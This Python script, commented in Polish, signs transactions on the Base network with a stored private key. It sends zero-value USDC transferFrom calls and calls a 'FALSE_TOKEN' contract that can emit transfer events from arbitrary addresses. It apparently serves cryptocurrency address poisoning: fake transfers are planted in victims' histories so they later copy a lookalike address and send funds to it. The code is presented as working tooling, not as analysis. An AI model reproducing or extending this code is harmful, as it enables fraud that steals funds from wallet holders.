from web3 import Web3
import api_keys as key
import sys
from backend.stats.database_stats import insert_log

from contract import CONTRACT_ADDRESS
from backend.stats.monitor_loging import log_message


sys.stdout.reconfigure(encoding='utf-8')
# Połączenie z siecią
#NODE_URL = key.INFURA_WSS  # np. "wss://base-mainnet.infura.io/ws/v3/TWOJ_KLUCZ"
#NODE_URL = 'wss://base-mainnet.infura.io/ws/v3/'+key.INFURA
NODE_URL = 'https://base-mainnet.infura.io/v3/' +key.INFURA
web3 = Web3(Web3.LegacyWebSocketProvider(NODE_URL))
PRIVATE_KEY = key.PRIVATEMM
ACCOUNT = web3.eth.account.from_key(PRIVATE_KEY)

FALSE_TOKEN_ADDRESS =CONTRACT_ADDRESS
USDC_CONTRACT_ADDRESS = '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913'

FALSE_TOKEN_ABI = [
    {
        "inputs": [
            {"internalType": "address", "name": "from", "type": "address"},
            {"internalType": "address", "name": "to", "type": "address"},
            {"internalType": "uint256", "name": "value", "type": "uint256"},
            {"internalType": "bool", "name": "onlyEvent", "type": "bool"}
        ],
        "name": "transfer",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

USDC_ABI = [

    {
        "constant": False,
        "inputs": [
            {"name": "_from", "type": "address"},
            {"name": "_to", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "transferFrom",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
    }
]



def wait_for_connection():
    """Czekaj na nawiązanie połączenia WebSocket"""
    timeout = 30  # Sekundy
    interval = 2  # Sekundy
    elapsed = 0
    while not web3.is_connected():
        if elapsed >= timeout:
            raise Exception("Nie udało się połączyć z siecią: przekroczono limit czasu")
        print("Czekam na połączenie z węzłem...")
        elapsed += interval


async def call_transfer(from_address, to_address, amount_token, transfer_type='transferFrom', only_event=True):
    """Uniwersalna funkcja do transferu (transferFrom lub transfer)"""
    try:
        from_address = web3.to_checksum_address(from_address)
        to_address = web3.to_checksum_address(to_address)
        amount = 0 if transfer_type == 'transferFrom' else int(amount_token * 10**18)  # USDC ma 6 miejsc po przecinku

        # Wybór kontraktu i ABI
        contract_address = USDC_CONTRACT_ADDRESS if transfer_type == 'transferFrom' else CONTRACT_ADDRESS
        abi = USDC_ABI if transfer_type == 'transferFrom' else FALSE_TOKEN_ABI 
        contract = web3.eth.contract(address=contract_address, abi=abi)

        # Czekaj na połączenie
        wait_for_connection()

        # Budowanie transakcji
        tx_params = {
            'from': ACCOUNT.address,
            'nonce': web3.eth.get_transaction_count(ACCOUNT.address),
            'chainId': web3.eth.chain_id,
            'gasPrice': int(web3.eth.gas_price * 1.2)
        }

        # Wybór metody transferu
        if transfer_type == 'transferFrom':
            gas_estimate = contract.functions.transferFrom(from_address, to_address, amount).estimate_gas(tx_params)
            tx = contract.functions.transferFrom(from_address, to_address, amount).build_transaction({
                **tx_params,
                'gas': int(gas_estimate * 1.2)
            })
        else:
            gas_estimate = contract.functions.transfer(from_address, to_address, amount, only_event).estimate_gas(tx_params)
            tx = contract.functions.transfer(from_address, to_address, amount, only_event).build_transaction({
                **tx_params,
                'gas': int(gas_estimate * 1.2)
            })

        print(f"Oszacowany gaz: {gas_estimate}, Ustawiony gaz: {int(gas_estimate * 1.2)}")
        print(f"Bazowa cena gazu: {web3.eth.gas_price} wei, Ustawiona cena: {tx_params['gasPrice']} wei")

        # Podpisywanie i wysyłanie transakcji
        signed_tx = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
        tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
        message = f"🔴 Transakcja wysłana: {web3.to_hex(tx_hash)}"
        log_message(message, log_type='transfer_tx')
        print(message)

        # Oczekiwanie na potwierdzenie
        receipt =  web3.eth.wait_for_transaction_receipt(tx_hash)
        status = "Sukces" if receipt.status == 1 else "Niepowodzenie"
        message = f"🔴 Status transakcji: {status}"
        insert_log("sended")
        #log_message(message, log_type='transfer_tx')
        print(message)
        return receipt.status == 1
    except Exception as e:
        message = f"Błąd: {e}"
        #log_message(message, log_type='error')
        print(message)
        return False
    


#asyncio.run(call_transfer('0x3F631685163a1A5883899AB84e45989AE0Df457f',"0x37c9dbF499948bC492564037ed5bC0FB19609dc0",5,"dupa"))